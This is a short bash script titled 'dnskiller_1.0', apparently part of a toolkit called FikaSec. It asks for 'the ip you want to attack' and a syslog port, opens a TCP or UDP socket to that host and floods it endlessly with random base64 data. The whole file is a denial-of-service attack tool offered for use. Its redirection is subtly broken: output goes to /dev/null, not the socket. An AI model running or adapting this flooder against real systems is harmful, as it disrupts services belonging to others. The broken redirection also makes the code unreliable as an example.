#!/bin/bash
# ~~~~~~~~~~ Environment Setup ~~~~~~~~~~ #
  NORMAL=`echo "\033[m"`
  BLUE=`echo "\033[36m"` #Blue
  NUMBER=`echo "\033[33m"` #yellow
  FGRED=`echo "\033[41m"`
  RED_TEXT=`echo "\033[31m"` #Red
  ENTER_LINE=`echo "\033[33m"`
  INTRO_TEXT=`echo "\033[32m"` #green and white text
  INFOS=`echo "\033[103;30m"` #yellow bg
  SUCCESS=`echo "\033[102;30m"` #green bg
  WARNING=`echo "\033[101;30m"` #red bg
  WARP=`echo "\033[106;30m"` #lightblue bg
  BLACK=`echo "\033[109;30m"` #SPACE bg
  END=`echo "\033[0m"`
# ~~~~~~~~~~ Environment Setup ~~~~~~~~~~ #
#info
ver=$(echo dnskiller_1.0)
#Author Volten

echo -e "${WARP}Enter the ip you want to attack.${END}"
read ip
echo ""
echo -e "${INFOS}Enter the syslog-port (normally 514)${END}"
read port
echo ""
echo -e "${INFOS}Enter tcp or udp (normally udp)${END}"
read tcpudp
echo ""
exec 9<>/dev/$tcpudp/$ip/$port
read -r -p "Do you want to go back to the Main menu Y, else use control+c to abort:" response
case $response in
[yY][eE][sS]|[yY])
bash FikaSec
;;
    *)
:
;;
esac
while true 
do
cat /dev/urandom | dd bs=1024 | base64 >&9 >/dev/null
done
